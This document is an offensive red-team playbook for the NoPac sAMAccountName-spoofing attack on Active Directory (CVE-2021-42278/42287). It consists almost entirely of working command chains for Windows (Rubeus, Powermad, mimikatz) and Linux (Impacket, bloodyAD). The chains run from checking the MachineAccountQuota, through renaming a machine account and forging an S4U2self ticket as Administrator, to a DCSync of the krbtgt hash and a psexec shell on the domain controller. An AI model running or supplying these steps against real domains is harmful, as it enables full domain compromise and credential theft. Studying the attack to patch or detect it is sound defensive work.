# sAMAccountName Spoofing (NoPac / CVE-2021-42278 + CVE-2021-42287)

> **Pre-req:** `source /opt/venvTools/bin/activate`

## Overview
Exploit the ability to create machine accounts (default `ms-DS-MachineAccountQuota = 10`) combined with the KDC's failure to validate sAMAccountName changes. Create a machine account, rename it to match the DC's sAMAccountName (without the `$`), request a TGT, rename it back, then use S4U2self to get a service ticket as a privileged user.

## Enumeration

### Check Vulnerability Prerequisites [added: 2026-04]
- **Tags:** #NoPac #sAMAccountName #CVE202142278 #CVE202142287 #MachineAccountQuota #VulnCheck #T1078
- **Trigger:** Domain access obtained; checking for NoPac/sAMAccountName spoofing vulnerability
- **Prereq:** Valid domain credentials; LDAP access to DC
- **Yields:** Confirmation of vulnerability (MAQ > 0 and unpatched KDC)
- **Opsec:** Low
- **Context:** Verify MachineAccountQuota and scan for vulnerability
- **Payload/Method:**
  ```powershell
  # Check MachineAccountQuota
  (Get-DomainObject -SearchScope Base)."ms-ds-machineaccountquota"

  # List machines created by specific users (to check quota usage)
  Get-DomainComputer -Filter '(ms-DS-CreatorSID=*)' -Properties name,ms-ds-creatorsid

  # Scan with noPac (Windows)
  .\noPac.exe scan -domain <DOMAIN> -user <USER> -pass <PASSWORD>
  ```
  ```bash
  # Scan from Linux
  python3 noPac/scanner.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -use-ldap
  ```

## Exploitation — Windows

### Full NoPac Chain (Manual Steps) [added: 2026-04]
- **Tags:** #NoPac #sAMAccountName #Rubeus #Mimikatz #S4U2self #DCSync #DomainEscalation #T1558
- **Trigger:** MachineAccountQuota > 0 and vulnerability confirmed on DC
- **Prereq:** MachineAccountQuota > 0; unpatched DC; Rubeus and PowerView/Powermad
- **Yields:** Domain Admin via forged S4U2self service ticket + DCSync of krbtgt
- **Opsec:** High
- **Context:** MachineAccountQuota > 0 and domain is vulnerable
- **Payload/Method:**
  ```powershell
  # Step 1: Create machine account
  $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
  New-MachineAccount -MachineAccount "<FAKE_MACHINE>" -Password $password -Domain <DOMAIN> -DomainController <DC_IP>

  # Step 2: Clear SPNs (to avoid conflicts)
  Set-DomainObject -Identity '<FAKE_MACHINE>$' -Clear 'serviceprincipalname' -Domain <DOMAIN> -DomainController <DC_IP>

  # Step 3: Rename sAMAccountName to DC name (without $)
  Set-MachineAccountAttribute -MachineAccount "<FAKE_MACHINE>" -Value "<DC_NAME>" -Attribute samaccountname -Domain <DOMAIN> -DomainController <DC_IP>

  # Step 4: Request TGT as the spoofed DC
  .\Rubeus.exe asktgt /user:<DC_NAME> /password:<PASSWORD> /domain:<DOMAIN> /dc:<DC_IP> /nowrap

  # Step 5: Rename back to original (so KDC can't find the account and falls back to DC$)
  Set-MachineAccountAttribute -MachineAccount "<FAKE_MACHINE>" -Value "<FAKE_MACHINE>" -Attribute samaccountname -Domain <DOMAIN> -DomainController <DC_IP>

  # Step 6: S4U2self to get service ticket as Administrator
  .\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:"cifs/<DC_FQDN>" /dc:<DC_IP> /ptt /ticket:<BASE64_TGT>

  # Step 7: DCSync
  .\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /kdc:<DC_FQDN> /user:krbtgt" exit
  ```

## Exploitation — Linux

### NoPac Chain with Impacket + bloodyAD [added: 2026-04]
- **Tags:** #NoPac #sAMAccountName #Impacket #bloodyAD #getST #LinuxAttack #T1558
- **Trigger:** Vulnerability confirmed; attacking from Linux
- **Prereq:** Valid domain credentials; Impacket and bloodyAD tools; MachineAccountQuota > 0
- **Yields:** Domain Admin via sAMAccountName spoofing + S4U2self from Linux toolchain
- **Opsec:** High
- **Context:** Same attack from Linux
- **Payload/Method:**
  ```bash
  # Step 1: Get account info
  python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> get object <FAKE_MACHINE>

  # Step 2: Clear SPNs and set sAMAccountName
  python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set object <FAKE_MACHINE>$ servicePrincipalName
  python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set object <FAKE_MACHINE>$ sAMAccountName -v '<DC_NAME>'

  # Step 3: Request TGT
  getTGT.py <DOMAIN>/<DC_NAME>:<PASSWORD> -dc-ip <DC_IP>

  # Step 4: Rename back
  python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC_IP> set object <FAKE_MACHINE>$ sAMAccountName -v '<FAKE_MACHINE>$'

  # Step 5: S4U2self for service ticket
  KRB5CCNAME=<DC_NAME>.ccache getST.py <DOMAIN>/<DC_NAME> -self -impersonate Administrator -altservice cifs/<DC_FQDN> -k -no-pass -dc-ip <DC_IP>

  # Step 6: Use the ticket
  KRB5CCNAME=Administrator@cifs_<DC_FQDN>.ccache psexec.py <DC_FQDN> -k -no-pass
  ```
